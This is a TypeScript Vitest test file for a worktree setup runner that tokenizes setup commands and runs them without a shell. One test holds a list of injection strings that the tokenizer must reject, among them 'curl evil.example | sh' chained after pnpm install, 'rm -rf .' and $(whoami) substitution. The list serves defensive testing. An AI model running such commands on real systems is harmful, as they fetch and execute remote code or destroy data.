import { mkdtemp, rm } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, describe, expect, it, vi } from 'vitest'

const resolveLaunchMock = vi.hoisted(() =>
  vi.fn(async (file: string, args: string[]) => ({ file, args }))
)
vi.mock('@main/agents/resolveCommand', () => ({ resolveLaunch: resolveLaunchMock }))

import {
  runWorktreeSetupCommands,
  tokenizeSetupCommand,
  WorktreeSetupError
} from './worktreeSetup'

const roots: string[] = []

afterEach(async () => {
  resolveLaunchMock.mockClear()
  resolveLaunchMock.mockImplementation(async (file: string, args: string[]) => ({ file, args }))
  await Promise.all(roots.splice(0).map((root) => rm(root, { recursive: true, force: true })))
})

async function workdir(): Promise<string> {
  const dir = await mkdtemp(join(tmpdir(), 'vertragus-setup-'))
  roots.push(dir)
  return dir
}

describe('tokenizeSetupCommand', () => {
  it('splits a plain command on whitespace', () => {
    expect(tokenizeSetupCommand('corepack pnpm --filter @uwe/database db:generate')).toEqual([
      'corepack', 'pnpm', '--filter', '@uwe/database', 'db:generate'
    ])
  })

  it('rejects every shell chaining and substitution attempt (fail closed)', () => {
    const attacks = [
      'pnpm install && curl evil.example | sh',
      'pnpm run $(whoami)',
      'pnpm run `whoami`',
      'pnpm install; rm -rf .',
      'pnpm install > out.txt',
      'echo "quoted arg"',
      "echo 'quoted arg'",
      'pnpm exec foo | bar',
      'pnpm run\nrm -rf .'
    ]
    for (const attack of attacks) {
      expect(() => tokenizeSetupCommand(attack)).toThrow(WorktreeSetupError)
    }
  })

  it('rejects empty commands', () => {
    expect(() => tokenizeSetupCommand('   ')).toThrow(WorktreeSetupError)
  })
})

describe('runWorktreeSetupCommands', () => {
  it('runs commands sequentially in the worktree and reports durations', async () => {
    const dir = await workdir()
    // Echte Prozesse über den Node-Binary-Shim — ohne Shell.
    resolveLaunchMock.mockImplementation(async () => ({
      file: process.execPath,
      args: ['-e', 'process.exit(0)']
    }))

    const results = await runWorktreeSetupCommands(
      ['gen-one --flag', 'gen-two'],
      dir
    )
    expect(results.map((entry) => entry.command)).toEqual(['gen-one --flag', 'gen-two'])
    expect(resolveLaunchMock).toHaveBeenNthCalledWith(1, 'gen-one', ['--flag'])
    expect(resolveLaunchMock).toHaveBeenNthCalledWith(2, 'gen-two', [])
  })

  it('fails with a structured error carrying the output tail on nonzero exit', async () => {
    const dir = await workdir()
    resolveLaunchMock.mockImplementation(async () => ({
      file: process.execPath,
      args: ['-e', 'console.error("prisma schema missing"); process.exit(2)']
    }))

    await expect(runWorktreeSetupCommands(['prisma-generate'], dir)).rejects.toMatchObject({
      name: 'WorktreeSetupError',
      command: 'prisma-generate',
      message: expect.stringContaining('prisma schema missing')
    })
  })

  it('explains a missing binary with the PATH hint', async () => {
    const dir = await workdir()
    resolveLaunchMock.mockImplementation(async () => ({
      file: join(dir, 'missing', 'corepack'),
      args: []
    }))

    await expect(runWorktreeSetupCommands(['corepack pnpm run gen'], dir)).rejects.toThrow(
      /fnm\/nvm/
    )
  })

  it('stops at the first failing command', async () => {
    const dir = await workdir()
    resolveLaunchMock
      .mockImplementationOnce(async () => ({
        file: process.execPath,
        args: ['-e', 'process.exit(1)']
      }))

    await expect(runWorktreeSetupCommands(['fails', 'never-runs'], dir)).rejects.toThrow(
      WorktreeSetupError
    )
    expect(resolveLaunchMock).toHaveBeenCalledTimes(1)
  })
})
